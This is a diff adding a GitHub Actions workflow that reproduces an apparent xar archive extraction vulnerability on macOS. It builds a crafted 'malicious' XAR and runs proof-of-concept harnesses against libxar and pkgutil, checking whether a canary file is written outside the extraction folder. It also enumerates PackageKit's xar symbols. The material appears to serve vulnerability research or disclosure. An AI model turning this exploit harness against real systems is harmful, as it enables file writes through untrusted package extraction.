@@ -1,0 +1,184 @@
+name: gate_a_d_run24
+
+on:
+  workflow_dispatch:
+
+jobs:
+  gate_a_d:
+    runs-on: macos-15
+    permissions:
+      contents: write
+
+    steps:
+      - name: Checkout repo
+        uses: actions/checkout@v4
+
+      - name: Clone xar-501 at 7c1427d
+        run: |
+          git clone https://github.com/apple-oss-distributions/xar.git /tmp/xar_src
+          cd /tmp/xar_src && git checkout 7c1427d
+
+      - name: Build libxar at 7c1427d
+        continue-on-error: true
+        run: |
+          cd /tmp/xar_src/xar
+          ./configure --prefix=/tmp/xar_inst 2>&1 | tail -5
+          make -j4 2>&1 | tail -10
+          make install 2>&1 | tail -5
+          ls -la /tmp/xar_inst/lib/ || echo "(libxar build failed)"
+
+      - name: Build malicious XAR (SHA1 correct, FLAT)
+        run: |
+          mkdir -p /tmp/xar_build
+          cp build_xar_r24.c /tmp/xar_build/build_xar_r24.c
+          cd /tmp/xar_build
+          cc -O2 -o build_xar_r24 build_xar_r24.c -lz
+          ./build_xar_r24
+          ls -la malicious_ga.xar
+
+      - name: Gate D — run PoC (libxar 7c1427d)
+        continue-on-error: true
+        run: |
+          mkdir -p /tmp/gate_d_r24
+          cat > /tmp/gate_d_r24/poc_d.c << 'C_EOF'
+          #include <stdio.h>
+          #include <stdlib.h>
+          #include <dlfcn.h>
+          #include <unistd.h>
+          #include <sys/stat.h>
+          #include <limits.h>
+          #include <stdint.h>
+          typedef void* xar_t; typedef void* xar_file_t; typedef void* xar_iter_t;
+          int main(int argc, char *argv[]) {
+              void *h=dlopen("/tmp/xar_inst/lib/libxar.1.dylib",RTLD_LAZY);
+              if(!h){fprintf(stderr,"dlopen:%s\n",dlerror());return 1;}
+              typedef xar_t (*xar_open_fn)(const char*,int32_t);
+              typedef int   (*xar_extract_fn)(xar_t,xar_file_t);
+              typedef xar_iter_t (*xar_iter_new_fn)(void);
+              typedef xar_file_t (*xar_file_first_fn)(xar_t,xar_iter_t);
+              typedef xar_file_t (*xar_file_next_fn)(xar_iter_t);
+              typedef int   (*xar_close_fn)(xar_t);
+              typedef void  (*xar_iter_free_fn)(xar_iter_t);
+              xar_open_fn      fn_o =(xar_open_fn)      dlsym(h,"xar_open");
+              xar_extract_fn   fn_e =(xar_extract_fn)   dlsym(h,"xar_extract");
+              xar_iter_new_fn  fn_in=(xar_iter_new_fn)  dlsym(h,"xar_iter_new");
+              xar_file_first_fn fn_f=(xar_file_first_fn)dlsym(h,"xar_file_first");
+              xar_file_next_fn fn_n =(xar_file_next_fn) dlsym(h,"xar_file_next");
+              xar_close_fn     fn_c =(xar_close_fn)     dlsym(h,"xar_close");
+              xar_iter_free_fn fn_if=(xar_iter_free_fn) dlsym(h,"xar_iter_free");
+              char abs[4096];
+              realpath(argc>1?argv[1]:"malicious_ga.xar",abs);
+              mkdir("/tmp/gate_d_flat",0755); chdir("/tmp/gate_d_flat");
+              xar_t x=fn_o(abs,0);
+              if(!x){fprintf(stderr,"xar_open failed\n");return 1;}
+              xar_iter_t xi=fn_in();
+              for(xar_file_t f=fn_f(x,xi);f;f=fn_n(xi)){
+                  int rc=fn_e(x,f); printf("[*] xar_extract rc=%d\n",rc);
+              }
+              fn_if(xi); fn_c(x);
+              struct stat st;
+              if(stat("/tmp/xar_gated_canary_macos.txt",&st)==0){
+                  printf("[!] GATE D PASS: canary exists\n"); return 0;
+              }
+              printf("[-] GATE D FAIL\n"); return 1;
+          }
+          C_EOF
+          cd /tmp/gate_d_r24
+          cc -O2 -o poc_d poc_d.c -Wl,-rpath,/tmp/xar_inst/lib
+          ./poc_d /tmp/xar_build/malicious_ga.xar
+          ls -la /tmp/xar_gated_canary_macos.txt 2>/dev/null && \
+            echo "GATE_D=PASS" || echo "GATE_D=FAIL"
+
+      - name: Enumerate xar in system libraries
+        run: |
+          echo "=== System xar library search ==="
+          find /usr/lib /System/Library -name "*xar*" 2>/dev/null | head -20
+          PK="/System/Library/PrivateFrameworks/PackageKit.framework/Versions/A/PackageKit"
+          echo "=== otool -L on PackageKit ==="
+          otool -L "$PK" 2>/dev/null | head -30
+          echo "=== nm xar symbols in PackageKit ==="
+          nm -gU "$PK" 2>/dev/null | grep -i xar | head -30 || echo "(nm: no xar exports)"
+          echo "=== strings xar in PackageKit ==="
+          strings "$PK" 2>/dev/null | grep -i "xar_open\|xar_extract\|xar_iter" | head -20
+          echo "=== macOS version ==="
+          sw_vers
+          echo "=== dyld shared cache ==="
+          ls /private/var/db/dyld/ 2>/dev/null | head -5
+
+      - name: Gate A — build PoC Run 24
+        run: |
+          mkdir -p /tmp/gate_a_pk
+          cp poc_gate_a_r21.c /tmp/gate_a_pk/poc_gate_a_r24.c
+          wc -l /tmp/gate_a_pk/poc_gate_a_r24.c
+          cc -O2 -o /tmp/gate_a_pk/poc_gate_a_r24 /tmp/gate_a_pk/poc_gate_a_r24.c
+          echo "Gate A PoC built OK"
+
+      - name: Gate A — run PoC Run 24 (SIGALRM timeout, no timeout cmd)
+        run: |
+          cd /tmp/gate_a_pk
+          ./poc_gate_a_r24 /tmp/xar_build/malicious_ga.xar \
+            2>&1 | tee poc_output.txt
+          echo "=== POC exit check ==="
+          ls -la /tmp/xar_gated_canary_macos.txt 2>/dev/null && \
+            echo "GATE_A=PASS" || echo "GATE_A=FAIL"
+
+      - name: Gate A — pkgutil expand our malicious XAR directly
+        continue-on-error: true
+        run: |
+          rm -rf /tmp/pkg_expand && mkdir -p /tmp/pkg_expand
+          echo "=== pkgutil --expand on malicious_ga.xar ==="
+          pkgutil --expand /tmp/xar_build/malicious_ga.xar /tmp/pkg_expand/out 2>&1 | \
+            tee /tmp/pkg_build_pkgutil.txt || true
+          echo "=== pkgutil expand tree ==="
+          find /tmp/pkg_expand -ls 2>/dev/null
+          ls -la /tmp/xar_gated_canary_macos.txt 2>/dev/null && \
+            echo "GATE_A=PASS (pkgutil)" || echo "GATE_A=FAIL (pkgutil)"
+
+      - name: Collect and push results via git
+        if: always()
+        run: |
+          cd $GITHUB_WORKSPACE
+          {
+            echo "=== RUN 24 RESULTS ==="
+            echo "date: $(date -u)"
+            echo ""
+            echo "=== SYSTEM XAR LIBS ==="
+            find /usr/lib /System/Library -name "*xar*" 2>/dev/null | head -20
+            echo ""
+            PK="/System/Library/PrivateFrameworks/PackageKit.framework/Versions/A/PackageKit"
+            echo "=== otool -L PackageKit ==="
+            otool -L "$PK" 2>/dev/null | head -30
+            echo ""
+            echo "=== NM xar in PackageKit ==="
+            nm -gU "$PK" 2>/dev/null | grep -i xar | head -30 || echo "(none)"
+            echo ""
+            echo "=== STRINGS xar in PackageKit ==="
+            strings "$PK" 2>/dev/null | grep -i "xar_open\|xar_extract\|xar_iter" | head -20
+            echo ""
+            echo "=== GATE D ==="
+            ls -la /tmp/xar_gated_canary_macos.txt 2>/dev/null && \
+              echo "GATE_D=PASS" || echo "GATE_D=FAIL"
+            echo ""
+            echo "=== POC OUTPUT (Gate A Run 24) ==="
+            cat /tmp/gate_a_pk/poc_output.txt 2>/dev/null || echo "(not found)"
+            echo ""
+            echo "=== PKGUTIL OUTPUT ==="
+            cat /tmp/pkg_build_pkgutil.txt 2>/dev/null || echo "(not found)"
+            echo ""
+            echo "=== macOS version ==="
+            sw_vers
+          } > run24_results.log
+          cat run24_results.log
+          git config user.email "ci@gate-a"
+          git config user.name "Gate A CI"
+          git add run24_results.log
+          git commit -m "Run 24 results [ci skip]" || echo "(nothing to commit)"
+          git push https://YuvalFradkin1:REDACTED_PAT@github.com/YuvalFradkin1/xar-symlink2-repro.git HEAD:main
+
+      - name: Upload evidence artifact
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: gate-a-d-run24-evidence
+          path: run24_results.log
+          retention-days: 30
